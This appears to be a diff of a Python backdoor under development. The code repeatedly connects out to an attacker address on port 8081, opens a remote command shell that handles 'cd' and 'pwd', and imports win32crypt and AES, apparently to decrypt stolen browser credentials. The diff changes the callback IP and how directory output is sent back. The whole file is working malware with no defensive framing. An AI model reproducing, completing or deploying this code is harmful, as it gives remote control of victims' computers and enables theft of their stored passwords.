@@ -13,7 +13,6 @@ import threading
 import time
 import requests
 import re
-
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
@@ -299,7 +298,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            connection_to_attacker.connect(("192.168.246.129", 8081))
+            connection_to_attacker.connect(("192.168.0.105", 8081))
             shell()
             connection_to_attacker.close()
             break
@@ -317,7 +316,9 @@ def shell():
         elif command[:3] == 'cd ':
             try:
                 os.chdir(command[3:])
-                reliable_send("You are now at : "+os.getcwd())
+                file = os.getcwd()
+                files = str(file)
+                reliable_send(files)
             except:
                 pass
         elif command == 'pwd':
